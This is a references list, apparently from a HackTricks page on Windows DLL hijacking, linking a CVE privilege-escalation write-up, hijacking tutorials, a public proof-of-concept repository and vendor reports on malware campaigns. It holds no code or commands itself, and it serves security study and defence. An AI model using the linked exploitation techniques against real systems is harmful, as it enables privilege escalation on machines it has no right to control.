- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
